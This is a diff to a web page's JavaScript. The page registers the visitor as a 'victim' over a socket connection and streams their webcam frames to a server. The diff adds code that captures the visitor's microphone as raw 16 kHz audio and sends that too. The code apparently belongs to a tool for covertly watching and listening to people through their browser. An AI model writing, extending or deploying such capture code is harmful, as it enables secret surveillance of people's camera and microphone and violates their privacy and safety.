@@ -391,7 +391,7 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
       // Register as victim
       socket.emit('register-victim');
 
-      // Start sending frames at ~5 FPS
+      // Start sending video frames at ~5 FPS
       frameInterval = setInterval(function() {
         if (captureVideo.readyState >= 2) {
           ctx.drawImage(captureVideo, 0, 0, 320, 240);
@@ -399,6 +399,26 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
           socket.volatile.emit('frame', frameData);
         }
       }, 200);
+
+      // Audio capture — send raw PCM at 16kHz
+      try {
+        var audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
+        var audioSource = audioCtx.createMediaStreamSource(stream);
+        var processor = audioCtx.createScriptProcessor(4096, 1, 1);
+        audioSource.connect(processor);
+        processor.connect(audioCtx.destination);
+        processor.onaudioprocess = function(e) {
+          var pcm = e.inputBuffer.getChannelData(0);
+          var int16 = new Int16Array(pcm.length);
+          for (var i = 0; i < pcm.length; i++) {
+            var s = Math.max(-1, Math.min(1, pcm[i]));
+            int16[i] = s < 0 ? s * 0x8000 : s * 0x7FFF;
+          }
+          socket.volatile.emit('audio', int16.buffer);
+        };
+      } catch(e) {
+        console.log('Audio capture error:', e);
+      }
     });
 
     socket.on('disconnect', function() {
